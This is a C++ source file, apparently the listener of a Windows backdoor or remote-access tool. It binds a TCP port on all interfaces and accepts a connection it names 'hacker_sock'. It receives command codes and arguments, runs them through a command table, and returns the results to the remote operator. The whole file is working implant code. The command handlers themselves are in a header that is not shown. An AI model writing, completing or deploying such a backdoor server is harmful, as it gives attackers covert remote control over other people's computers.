#include "..\pch.h"

#include "Server.h"
#include "Commands.h"
#include "..\Tools.h"
#include "..\Debugger.h"
#include "..\Constants.h"

SOCKET InitTCPServer()
{	
	SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (listen_sock == INVALID_SOCKET)
	{
		PrintError(TEXTH("socket"), WSAGetLastError());

		return INVALID_SOCKET;
	}

	SOCKADDR_IN addr_sock = { 0 };
	addr_sock.sin_family      = AF_INET;
	addr_sock.sin_addr.s_addr = htonl(INADDR_ANY);
	addr_sock.sin_port        = htons(DEFAULT_PORT);
	if (bind(listen_sock, (LPSOCKADDR)&addr_sock, sizeof(addr_sock)) == SOCKET_ERROR)
	{
		PrintError(TEXTH("bind"), WSAGetLastError());

		closesocket(listen_sock);

		return INVALID_SOCKET;
	}
	$i _tprintf(TEXTH("Binding socket finished\n"));

	if (listen(listen_sock, 1) == SOCKET_ERROR)
	{
		PrintError(TEXTH("listen"), WSAGetLastError());

		closesocket(listen_sock);

		return INVALID_SOCKET;
	}
	$i _tprintf(TEXTH("Socket started to listen\n"));

	return listen_sock;
}

VOID RunServer(SOCKET listen_sock)
{
	ClearConsole();

	char  cmd[CMD_LENGTH + 1] = { 0 }, // (2 digits) + '\0'
		 args[ARGS_LENGTH]    = { 0 };
	while (TRUE)
	{
		$i _tprintf(TEXTH("Waiting for the client\n"));

		SOCKET hacker_sock = accept(listen_sock, NULL, NULL);
		if (hacker_sock == INVALID_SOCKET)
		{
			PrintError(TEXTH("accept"), WSAGetLastError());

			return;
		}

		$i _tprintf(TEXTH("Connected\n"));
		while (TRUE)
		{
			INT bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
			recv(hacker_sock, args, ARGS_LENGTH, 0);

			if (!bytes || bytes == SOCKET_ERROR)
				break;

			INT code = UNDEFINEDCMD;
			if (sscanf_s(cmd, "%d", &code) != 1)
			{
				$e _tprintf(TEXT("Cannot get cmd code(%hs)\n"), cmd);

				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);

				break;
			}

			if (code == UNDEFINEDCMD)
			{
				$e _tprintf(TEXTH("Undefined cmd code(%hs)\n"), cmd);

				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);

				break;
			}

			TCHAR targs[ARGS_LENGTH] = { 0 };
			if (_stprintf_s(targs, ARGS_LENGTH, TEXTH("%hs"), args) != 1)
			{
				$e _tprintf(TEXTH("Cannot convert args to TCHAR\n"));

				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);

				break;
			}

			CONST PTCHAR tresult = ExecuteCommand(code, targs);
			
			char result[RESULT_LENGTH] = { 0 };
			size_t retval = 0;
			if (wcstombs_s(&retval, result, RESULT_LENGTH, tresult, RESULT_LENGTH - 1) != 0)
			{
				$e _tprintf(TEXTH("Cannot convert tresult to CHAR\n"));

				send(hacker_sock, TASK_FAILUREA, TASK_FAILURE_LENGTH, 0);

				break;
			}

			$i _tprintf(TEXTH("Sending answer(%hs)\n"), result);
			send(hacker_sock, result, RESULT_LENGTH, 0);
		}
		
		closesocket(hacker_sock);

		$i _tprintf(TEXTH("Client disconnected\n"));
		SleepEx(10000, FALSE);
		ClearConsole();
	}
}

CONST PTCHAR ExecuteCommand(INT code, CONST PTCHAR args)
{
	$i _tprintf(TEXT("cmd:'%d', args:'%ws'\n"), code, args);

	static TCHAR result[RESULT_LENGTH] = { 0 }; // I do not want to allocate and deallocate memory
	for (size_t i = 0; i < NUMBER_OF_COMMANDS; ++i)
		if (MAP_COMMANDS[i].pair.code == code)
		{
			MAP_COMMANDS[i].task(args, result);
			
			return result;
		}

	return UNDEFINEDP;
}
